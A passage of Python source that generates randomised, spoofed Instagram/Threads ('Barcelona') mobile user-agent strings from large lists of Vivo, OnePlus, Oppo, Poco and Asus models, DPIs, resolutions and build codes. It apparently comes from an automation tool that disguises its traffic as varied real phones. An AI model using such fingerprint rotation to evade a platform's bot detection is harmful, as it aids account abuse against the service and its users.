'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A']
        self.vivo2 = ["vivo/iQOO 5 Pro", "vivo/iQOO 7", "vivo/iQOO Z5", "vivo/iQOO U3", "vivo/iQOO U1x", "vivo/iQOO Neo 3", "vivo/iQOO U1", "vivo/iQOO 8", "vivo/iQOO 9", "vivo/iQOO Z3", "vivo/iQOO Z6", "vivo/iQOO Z7", "vivo/iQOO U5", "vivo/iQOO U3x", "vivo/iQOO 6", "vivo/iQOO 10", "vivo/iQOO Z1", "vivo/iQOO 11", "vivo/iQOO Z2", "vivo/iQOO 12", "vivo/iQOO Z4", "vivo/iQOO 13", "vivo/iQOO Z8", "vivo/iQOO 14", "vivo/iQOO Z9", "vivo/iQOO 15", "vivo/iQOO Z10", "vivo/iQOO 16", "vivo/iQOO Z11", "vivo/iQOO 17", "vivo/iQOO Z12"]
        self.oneplus = ['NE2213', 'NE2217', 'NE2215', 'NE2210', 'NE2210', 'CPH2423', 'CPH2411', 'CPH2417', 'CPH2413', 'CPH2415', 'CPH2449', 'CPH2487', 'ONE A2003', 'ONE A2003', 'ONE A2001', 'ONE A2005', 'ONEPLUS A3003', 'ONEPLUS A3000', 'ONEPLUS A3010', 'ONEPLUS A5000', 'ONEPLUS A5000', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A5010', 'ONEPLUS A6003', 'ONEPLUS A6000', 'ONEPLUS A6010', 'ONEPLUS A6013', 'ONEPLUS A6010', 'GM1900', 'GM1901', 'GM1903', 'GM1917', 'GM1913', 'GM1911', 'GM1910', 'GM1915', 'GM1910', 'HD1901', 'HD1903', 'HD1900 Flow', 'HD1905', 'HD1900', 'HD1907', 'HD1911', 'HD1913', 'HD1910', 'GM1925', 'HD1925', 'GM1920', 'IN2013', 'IN2015', 'IN2010', 'IN2010', 'IN2017', 'IN2019', 'IN2023', 'IN2025', 'IN2020', 'OnePlus8Pro', 'KB2005', 'KB2001', 'KB2007', 'KB2003', 'KB2000', 'OnePlus 8T 5G', 'LE2115', 'LE2113', 'LE2111', 'LE2110', 'LE2120', 'LE2125', 'LE2123', 'LE2121', 'LE2127', 'OnePlus9Pro', 'LE2101', 'LE2100', 'MT2111', 'MT2110', 'ONEPLUS A19677', 'ONEPLUS A2345', 'Oneplus A31', 'Oneplus A3331', 'ONEPLUS A35904', 'ONEPLUS A37000', 'ONEPLUS A3EVB', 'ONEPLUS A62322', 'ONEPLUS A64794', 'ONEPLUS A65369', 'ONEPLUS A68333', 'ONEPLUS A70458', 'ONEPLUS A70791', 'ONEPLUS A78637', 'ONEPLUS A80828', 'ONEPLUS A83306', 'ONEPLUS A87046', 'ONEPLUS A90641', 'Oneplus A99831', 'PGKM10', 'PGKM10', 'PHK110', 'PHK110', 'PGP110', 'PGP110', 'PGZ110', 'ONEPLUS KB2023', 'OnePlus Nord', 'Oneplus Nord 2', 'DN2103', 'DN2101', 'CPH2399', 'CPH2401', 'AC2001', 'AC2003', 'IV2201', 'CPH2409', 'CPH2381', 'CPH2465', 'EB2103', 'EB2101', 'EB2101', 'BE2025', 'BE2026', 'BE2029', 'Nord N10 5G', 'BE2028', 'BE2013', 'BE2011', 'BE2012', 'CPH2459', 'GN2200', 'CPH2469', 'DE2118', 'DE2117', 'A0001', 'ONE E1001', 'ONE E1003', 'ONE E1001', 'ONE E1005']
        self.oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
        self.oppo2 = ["OP4F97", "OP4BA5L1", "OP664D1", "OP5F11L1", "OP2A92", "OP8F17", "OP8F31", "OP4C9E1", "OP5B31", "OP4BA6L1", "OP2B87", "OP6F21", "OP6C8E1", "OP8F11", "OPPOA16", "OPPOA15", "OPPOA11", "OPPOA73", "OPPOA37", "OPPOA53", "OPPOA33", "OPPOA93", "OPPOA35", "OPPOA83", "OPPOA57", "OPPOA71", "OPPOA39", "OPPOA3", "OPPOA51", "OPPOA27", "OPPOA79"]
        self.poco = ['M2006C3MI', '211033MI', '22031116AI', '220333QPG', '220333QPG', 'POCO C40', 'POCO C40', 'POCO F2 Pro', 'POCO F2 Pro', 'M2012K11AG', 'M2104K10I', '22021211RG', '22021211RI', 'POCO F4', 'POCO F4', 'POCO F4', '21121210G', 'POCO F4 GT', 'POCO F4 GT', '23049PCD8G', '23013PC75G', 'M2004J19PI', 'POCO M2 Pro', 'POCO M2 Pro', 'M2010J19CI', 'M2010J19CG', 'POCO M3', 'POCO M3 Pro', 'POCO M3 Pro', 'M2103K19PG', 'POCO M3 Pro 5G', '22041219PG', '22041219PI', 'POCO M4 5G', '2201117PG', '21091116AG', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', 'POCO M4 Pro 5G', '22071219CG', 'POCO M5', 'POCO M5', '22071219CI', '2207117BPG', 'POCO M5s', 'POCO X2', 'M2007J20CI', 'M2007J20CI', '21061110AG', 'M2007J20CG', 'M2102J20SG', 'M2102J20SI', '22041216G', 'POCO X4 GT', '22041216G', 'POCO X4 GT', 'POCO X4 GT', 'POCO X4 GT', '2201116PG', 'POCO X4 Pro 5G', '2201116PG', '2201116PI', '22111317PG', 'POCO X5 5G', 'POCO X5 5G', '22101320G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', 'POCO X5 Pro 5G', '22101320G']
        self.dpi = str(random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi']))
        self.pxl = str(random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733']))
        self.mt_qcom = str(random.choice(["qcom","mt6769", "qcom", "mt6768", "qcom","mt6767", "qcom","mt6765", "qcom","mt6763", "qcom","mt6757", "qcom","mt6755", "qcom","mt6753", "qcom","mt6739", "qcom","mt6737", "qcom","mt6735", "qcom","mt6595", "qcom","mt6582", "qcom","mt6572", "mt6571", "qcom","mt6570", "qcom","mt8563", "qcom","mt8167", "qcom","mt8163", "mt8135", "qcom","mt8127", "qcom","mt8125", "qcom","mt7623", "qcom","mt6797", "qcom","mt6592", "qcom","mt6590", "qcom","mt6580", "qcom","mt6573", "qcom","mt6575", "qcom","mt6260", "qcom","mt6236"]))
        self.device_android = str(random.choice(["27/9","27/10","27/11","27/12","27/12","27/13","28/9","28/10","28/11","28/12","28/12","28/13","29/9","29/10","29/11","29/12","29/12","29/13","27/9","30/10","30/11","30/12","30/12","30/13","31/9","31/10","31/11","31/12","31/12","31/13","32/9","32/10","32/11","32/12","32/12","32/13","33/9","33/10","33/11","33/12","33/12","33/13"]))
        self.kode = str(random.choice(['145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186']))
        self.locale = str(random.choice((["id_ID","en_GB", "en_US", "ar_LY", "fr_FR", "es_ES", "de_DE", "it_IT", "pt_BR", "tr_TR","ru_RU","in_ID"])))
        self.versi_istagram = random.choice(("70.0.0.15.98, 80.0.0.20.101,60.0.0.10.76, 85.0.0.25.100,75.0.0.22.99,72.0.0.18.94, 68.0.0.16.84,78.0.0.14.97, 63.0.0.20.81,81.0.0.24.105,73.0.0.16.96,67.0.0.18.88,84.0.0.21.110,74.0.0.18.100,71.0.0.15.92,79.0.0.14.103,62.0.0.18.80,87.0.0.22.115,76.0.0.20.102,83.0.0.18.10,66.0.0.16.87,88.0.0.24.118,77.0.0.22.103,64.0.0.18.82,82.0.0.20.107,69.0.0.14.92,89.0.0.20.123,61.0.0.14.76,86.0.0.18.112,65.0.0.12.86").split(","))
        self.asus = ['ASUS_A002','ASUS_A002A','ASUS_A002_1','ASUS_A002_2','ASUS_AI2201','ASUS_AI2201_B','QTI SM8475','ASUS_I001_1','ASUS_I001D','ASUS_I002D','ASUS_I003_1','ASUS_I003D','ASUS_I004D','ASUS_I005_1','ASUS_I005D','ASUS_I006D','ASUS_I006D','ASUS_I007_1','ASUS_I007D','ASUS_I01WD','ASUS_Z01QD_1','ASUS_Z01QD']
        self.iphn = random.choice(["11,8", "12,1", "9,2", "13,3", "10,5", "12,8", "10,4", "13,1", "9,1", "11,2"])
        self.ios = random.choice(["iOS 14_4_1", "iOS 15_0", "iOS 12_1_3", "iOS 15_0_1", "iOS 14_7_1", "iOS 14_6", "iOS 13_5", "iOS 14_0_1", "iOS 11_2_6", "iOS 15_1"])
        self.scale = random.choice(["2.00", "3.00", "2.61", "2.00", "2.61", "2.00", "3.00", "2.00", "2.61", "3.00"])
        self.gamut = random.choice(["display", "P3", "display", "wide", "P3", "display", "wide"])
        return(random.choice([
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; asus; {str(random.choice(self.asus))}; {str(random.choice(self.asus))}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; oppo; {str(random.choice(self.oppo))}; {str(random.choice(self.oppo2))}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; micromax; {str(random.choice(self.micromax))}; {str(random.choice(self.micromax))}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; oneplus; {str(random.choice(self.oneplus))}; {str(random.choice(self.oneplus))}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; vivo; {str(random.choice(self.vivo2))}; {str(random.choice(self.vivo))}; qcom; in_ID; {self.kode})',
              f'Barcelona {self.versi_istagram} Android ({self.device_android}; {self.dpi}; {self.pxl}; poco; {str(random.choice(self.poco))}; {str(random.choice(self.poco))}; qcom; in_ID; {self.kode})',
              f"Barcelona {self.versi_istagram} (iPhone{self.iphn}; {self.ios}; in_ID; in_ID; scale={self.scale}; gamut={self.gamut}; {self.pxl}; {self.kode})"  
       ]))
 
   def AppMek(self, GoblokLu=None):
       self.Dpi  = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
       self.Ppxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856',